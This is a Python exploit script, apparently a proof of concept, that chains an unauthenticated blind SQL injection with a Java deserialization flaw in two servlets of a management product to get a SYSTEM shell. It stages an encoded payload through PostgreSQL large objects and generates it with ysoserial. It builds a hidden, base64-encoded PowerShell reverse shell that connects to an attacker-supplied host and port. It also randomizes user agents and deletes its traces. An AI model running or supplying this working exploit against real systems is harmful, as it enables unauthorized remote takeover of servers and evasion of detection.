#!/usr/bin/python3
# DESCRIPTION
# Uses two unauthenticated vulnerabilities: a blind SQL injection in 'AMUserResourcesSyncServlet' and a deserialization RCE in 'CustomFieldsFeedServlet'
# Results in a shell running as SYSTEM
#
# EXAMPLE
# $ python3 poc_mam_v12410_sqli_udf_injection_and_deserialization_rce.py https://192.168.252.9:8443 192.168.252.14 9999 hex /usr/share/ysoserial/ysoserial-master-SNAPSHOT.jar
# [*] Generating payload
# [*] Creating PostgreSQL randomly generated LO for UDF injection...
# [*] Injecting hex encoded payload of length 5502 into LO...
# [*] Injecting 2 times of chunklength of 4096...
# [*] Exporting UDF library to filesystem...
# [*] Running deserialization...
# [*] Deleting existing LO using same randomly generated LO...
#
# Enjoy your shell listening at the indicated port

import requests
import urllib3
import random
import subprocess
from base64 import b64encode,b64decode
import io
import re
import os
import sys
import string
from random_useragent.random_useragent import Randomize     # Randomize useragent

# Optionally, use a proxy
# proxy = "http://<user>:<pass>@<proxy>:<port>"
proxy = ""
os.environ['http_proxy'] = proxy
os.environ['HTTP_PROXY'] = proxy
os.environ['https_proxy'] = proxy
os.environ['HTTPS_PROXY'] = proxy

# Disable cert warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Set timeout
timeout = 5

# Handle CTRL-C
def keyboard_interrupt():
    """Handles keyboardinterrupt exceptions"""
    print("\n\n[*] User requested an interrupt, exiting...")
    exit(0)

# Custom headers
def http_headers():
    # Randomize useragent
    useragent = Randomize().random_agent('desktop', 'windows')
    headers = {
        'User-Agent': useragent,
    }
    return headers

def get_session(baseurl,headers):
    """
    In: URL, HTTP Headers
    Performs: Initial call to receive session ID
    Out: Python requests Session
    """
    session = requests.session()
    r = session.get(baseurl,headers=headers,timeout=timeout,verify=False)
    return session

def encode_payload(raw_payload,encoding):
    # Read payload from file and base64 or hex encode
    b = io.BytesIO(raw_payload)
    if encoding == 'base64':
        b64_bytes = b64encode(b.read())
        payload = b64_bytes.decode('utf-8')
    elif encoding == 'hex':
        payload = b.read().hex()
    return payload

def create_request(baseurl,inj_str,headers,session):
    prefix = ";"
    suffix = ";-- "
    sqli = sanitize_string(prefix + inj_str + suffix)
    urlpath = "/servlet/AMUserResourcesSyncServlet"
    data = {'ForMasRange':'1',
            'userId':'1' + sqli}
    r = session.post(baseurl + urlpath,data=data,headers=headers,timeout=timeout,allow_redirects=False,verify=False)

def gen_encoded_payload(ysoserial_path,revhost,revport):
    print("[*] Generating payload")
    ps_payload = "$client = New-Object System.Net.Sockets.TCPClient('" + revhost + "'," + str(revport) + ");$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};"
    b64_le_payload = b64encode(ps_payload.encode('UTF-16LE'))
    ps_encoded_cmd = "powershell.exe -ep bypass -nol -noni -w hidden -nop -e " + b64_le_payload.decode('utf-8')
    deser_payload = "CommonsCollections1"
    ysoserial_payload = subprocess.run(["java", "-jar", ysoserial_path, deser_payload,ps_encoded_cmd],stdout=subprocess.PIPE)
    return ysoserial_payload.stdout

def sanitize_string(inj_str):
    inj_regex_str = re.sub("'","$$",inj_str)              # Replace single quote for $$
    return inj_regex_str

def delete_lo(loid):
    print("[*] Deleting existing LO...")
    sql = "select lo_unlink(" + str(loid) + ")"
    return sql

def create_lo(rand_name,temp_path):
    print("[*] Creating PostgreSQL randomly generated LO for UDF injection...")
    sql = "copy (select lo_creat(-1)) to '" + temp_path + rand_name + "';"
    sql += "create table " + rand_name + "(t integer);"
    sql += "copy " + rand_name + "(t) from '" + temp_path + rand_name + "';"
    return sql

def inject_udf(rand_name,payload,encoding,chunk,url,headers,session):
    print("[*] Injecting " + encoding + " encoded payload of length " + str(len(payload)) + " into LO...")
    rounded = round(len(payload) / chunk) + 1           # +1 due to stupid Python 3 handling of rounding
    print("[*] Injecting " + str(rounded) + " times of chunklength of " + str(chunk) + "...")
    for i in range(0, int(rounded)):
        start_chunk = i * chunk
        end_chunk = start_chunk + chunk
        payload_chunk = payload[start_chunk:end_chunk]
        sql = "with somename as (select t from " + rand_name + ") insert into pg_largeobject (loid, pageno, data) select t," + str(i) + ",decode('" + payload_chunk + "','" + encoding + "') from somename"
        create_request(url,sql,headers,session)

def export_udf(rand_name,write_path_file):
    print("[*] Exporting UDF library to filesystem...")
    sql = "with somename as (select t from " + rand_name + ") select lo_export(t, '" + write_path_file + "') from somename"
    return sql

def deserialize_payload(baseurl,headers,session,payl_loc):
    print("[*] Running deserialization...")
    urlpath = "/servlet/CustomFieldsFeedServlet"
    data = {'customFieldObject':payl_loc}
    r = session.post(baseurl + urlpath,data=data,headers=headers,timeout=timeout,allow_redirects=False,verify=False)

def delete_lo(rand_name):
    print("[*] Deleting existing LO using same randomly generated LO...")
    sql = "with somename as (select t from " + rand_name + ") select lo_unlink(t) from somename;"
    sql += "drop table " + str(rand_name) + ";"
    return sql

# Main
def main(argv):
    if len(sys.argv) == 6:
        baseurl = sys.argv[1]
        revhost = sys.argv[2]
        revport = sys.argv[3]
        encoding = sys.argv[4]
        ysoserial_path = sys.argv[5]
    else:
        print("[*] Usage: " + sys.argv[0] + " <base_url> <reverse_shell_host> <reverse_shell_port> <encoding_base64-or-hex> <ysoserial_path>")
        print("[*] Example: " + sys.argv[0] + " https://192.168.252.9:8443 192.168.252.14 6969 hex /usr/share/ysoserial/ysoserial-master-SNAPSHOT.jar\n")
        exit(0)

    # Check variable of entered encoding
    if (encoding != "base64" and encoding != "hex"):
        print("[!] Encoding needs to be hex or base64\n")
        exit(-1)

    # Check to see if it is a file to read as an argument
    if not os.path.isfile(ysoserial_path):
        # Print error and bail, file not there
        print("[!] The following file does not exist: " + ysoserial_path + "\n")
        exit(-1)

    # Variables
    headers = http_headers()
    
    # Paths and files
    rand_name = ''.join(random.choice(string.ascii_lowercase) for _ in range(20))
    temp_path = "c:\\windows\\temp\\"
    write_path_file = temp_path + rand_name + ".ser"
    
    # Chunk size
    chunk = 4096

    # Do stuff
    try:
        # Generate payload
        payload = encode_payload(gen_encoded_payload(ysoserial_path,revhost,revport), encoding)
        # Get initial session
        session = get_session(baseurl,headers)
        # Create LO
        create_request(baseurl,create_lo(rand_name,temp_path),headers,session)
        # Inject UDF
        inject_udf(rand_name,payload,encoding,chunk,baseurl,headers,session)
        # Export UDF
        create_request(baseurl,export_udf(rand_name,write_path_file),headers,session)
        # Run deserialized payload
        deserialize_payload(baseurl,headers,session,write_path_file)
        # Delete LO
        create_request(baseurl,delete_lo(rand_name),headers,session)

    except requests.exceptions.Timeout:
        print("[!] Timeout error\n")
        exit(-1)
    except requests.exceptions.TooManyRedirects:
        print("[!] Too many redirects\n")
        exit(-1)
    except requests.exceptions.ConnectionError:
        print("[!] Not able to connect to URL\n")
        exit(-1)
    except requests.exceptions.RequestException as e:
        print("[!] " + str(e))
        exit(-1)
    except requests.exceptions.HTTPError as e:
        print("[!] Failed with error code - " + e.code + "\n")
        exit(-1)
    except KeyboardInterrupt:
        keyboard_interrupt()

# If we were called as a program, go execute the main function.
if __name__ == "__main__":
    main(sys.argv[1:])
